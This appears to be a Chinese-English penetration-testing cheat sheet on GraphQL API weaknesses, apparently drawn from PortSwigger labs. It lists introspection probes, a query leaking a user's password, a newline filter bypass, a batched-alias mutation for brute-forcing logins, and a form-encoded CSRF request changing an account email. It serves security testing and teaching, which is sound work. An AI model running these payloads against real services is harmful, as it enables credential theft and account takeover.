GraphQL is an API query language that is designed to facilitate efficient communication between clients and servers. It enables the user to specify exactly what data they want in the response, helping to avoid the large response objects and multiple calls that can sometimes be seen with REST APIs.

GraphQL services define a contract through which a client can communicate with a server. The client doesn't need to know where the data resides. Instead, clients send queries to a GraphQL server, which fetches data from the relevant places. As GraphQL is platform-agnostic, it can be implemented with a wide range of programming languages and can be used to communicate with virtually any data store.

## 1. Principle

目标 GraphQL API 限制可绕过

## 2. Location

调用了 GraphQL API 的位置

> [H2-9000.txt](https://github.com/SexyBeast233/SecDictionary/blob/master/filelak/H2-9000.txt)
>
> [api-endpoints.txt ](https://github.com/danielmiessler/SecLists/blob/9da1d4931fc83e6999f09c5dae6802b2ad2ec7d0/Discovery/Web-Content/api/api-endpoints.txt)

## 3. Probe

探测是否使用 GraphQL API

```
{"query": "{__typename}"}
```

```
{
  "data": {
    "__typename": "query"
  }
}
```

探测是否支持 introspection

```
{"query": "{__schema{queryType{name}}}"}
```

```
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

在 Burp Suite 中 Set introspection query, 获取结果后用 [GraphQL Voyager](https://apis.guru/graphql-voyager/) 分析, 或者使用 Save GraphQL queries to site map 自动解析

## 4. Test

### 4.1. 无拦截

构造请求获取敏感信息

```
{"query": "query { getUser(id: 1) { id username password } }"}
```

```
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "xzj4poyzkj55qhgqld2f"
    }
  }
}
```

### 4.2. Bypass

添加换行符

```
{"query": "{__schema\n{queryType{name}}}"}
{"query": "{__schema%0a{queryType{name}}}"}
```

利用 JSON 特性爆破用户名密码, 绕过登录限制

```
{
  "query": "mutation { bruteforce0: login(input:{password:\"123456\", username:\"carlos\"}) { token success },bruteforce1: login(input:{password:\"password\", username:\"carlos\"}) { token success },bruteforce3: login(input:{password:\"12345678\", username:\"carlos\"}) { token success } }"
}
```

通过两次 `Change request method` 修改为 `x-www-form-urlencoded` 格式, 可生成 CSRF

```
Content-Type: application/x-www-form-urlencoded

query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

---

**References**

- [GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)